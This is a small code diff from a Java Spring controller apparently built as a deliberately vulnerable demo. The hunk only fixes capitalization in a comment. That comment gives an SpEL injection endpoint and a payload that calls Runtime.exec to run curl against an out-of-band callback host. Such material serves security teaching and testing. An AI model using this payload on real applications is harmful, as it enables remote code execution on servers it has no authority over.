@@ -16,7 +16,7 @@ import org.springframework.web.bind.annotation.RestController;
 public class SpEL {
 
     /**
-     * SPEL to RCE
+     * SpEL to RCE
      * http://localhost:8080/spel/vul/?expression=xxx.
      * xxx is urlencode(exp)
      * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
